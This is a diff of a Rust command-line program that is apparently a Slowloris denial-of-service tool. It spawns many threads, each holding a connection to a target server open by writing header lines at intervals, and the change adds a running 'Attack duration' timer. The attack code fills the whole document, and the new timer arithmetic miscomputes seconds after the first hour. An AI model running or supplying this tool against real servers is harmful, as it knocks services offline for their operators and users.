@@ -1,15 +1,15 @@
 extern crate rustc_serialize;
 extern crate docopt;
+extern crate time;
 
 use std::net;
 use std::io;
 use std::io::Write;
 use std::thread::sleep;
-use std::time;
 use std::error::Error;
 use std::str::FromStr;
 use std::process::exit;
-use std::thread::{spawn,JoinHandle};
+use std::thread::spawn;
 use docopt::Docopt;
 
 const USAGE: &'static str = "
@@ -50,7 +50,7 @@ struct AttackOptions {
 // This should be done using TryFrom trait, but it is not available in the version I currently have
 fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, net::AddrParseError> {
     let target = try!(net::SocketAddr::from_str(args.arg_target.as_str()));
-    let interval = time::Duration::from_secs(args.flag_interval);
+    let interval = time::Duration::seconds(args.flag_interval as i64);
 
     Result::Ok(AttackOptions{
         target: target,
@@ -90,7 +90,7 @@ fn slowloris(opts :AttackOptions) -> ! {
         loop {
             let hdr = format!("{}\r\n", opts.attack_header.as_str());
             ok_or_break!(stream.write_all(hdr.as_bytes()));
-            sleep(opts.interval);
+            sleep(opts.interval.to_std().unwrap());
         }
     }
 }
@@ -103,19 +103,26 @@ fn main() {
     let opts = args_to_attack_opts(args)
         .unwrap_or_else(|e| print_usage_and_exit(e));
 
-    let mut handles = vec![];
-    for i in 0..opts.connections {
+    let started = time::now();
+    for _ in 0..opts.connections {
         let opts = opts.clone();
 
-        let h = spawn(move || {
+        let _ = spawn(move || {
             slowloris(opts);
         });
-        handles.push(h)
     }
 
     println!("Succesfully spawned {} attack threads. ", opts.connections);
-
-    for h in handles {
-        h.join();
+    loop {
+        let tm = time::now()-started;
+        let hours = tm.num_hours();
+        let minutes = tm.num_minutes()-hours*60;
+        let seconds = tm.num_seconds()-minutes*60;
+        print!("Attack duration: {}h {}m {}s   ", hours, minutes, seconds);
+        io::stdout().flush().unwrap();
+        sleep(time::Duration::seconds(1).to_std().unwrap());
+        print!("\r");
+        io::stdout().flush().unwrap();
     }
+
 }
